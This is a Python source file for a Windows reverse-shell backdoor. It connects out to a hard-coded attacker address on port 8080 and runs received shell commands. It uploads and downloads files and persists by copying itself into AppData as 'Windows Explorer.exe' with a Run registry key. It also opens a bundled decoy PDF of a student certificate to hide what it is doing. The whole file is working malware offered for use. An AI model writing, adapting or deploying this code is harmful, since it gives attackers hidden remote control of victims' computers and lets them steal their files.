#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Backdoor:
    def __init__(self, IP, PORT):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((IP, PORT))

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "'
                + evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.sendall(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                chunk = self.connection.recv(1024).decode()
                json_data += chunk
                if len(chunk) < 1024:
                    return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return output.decode("utf-8", errors="ignore")
        except subprocess.CalledProcessError as e:
            return f"Command failed: {e.output.decode('utf-8', errors='ignore').strip()}"
        except Exception as e:
            return f"Unexpected error: {str(e)}"

    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return f"[+] Changing working directory to {path}"
        except Exception as e:
            return f"[-] Error changing directory: {str(e)}"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode()
        except Exception as e:
            return f"[-] Error reading file: {str(e)}"

    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
            return "[+] Upload successful."
        except Exception as e:
            return f"[-] Error writing file: {str(e)}"

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution."

            self.reliable_send(command_result)

file_name = sys._MEIPASS + "\ogrenci-belgesi.pdf"
subprocess.Popen(file_name, shell=True)

try:
    my_backdoor = Backdoor("192.168.163.128", 8080)
    my_backdoor.run()
except Exception:
    sys.exit()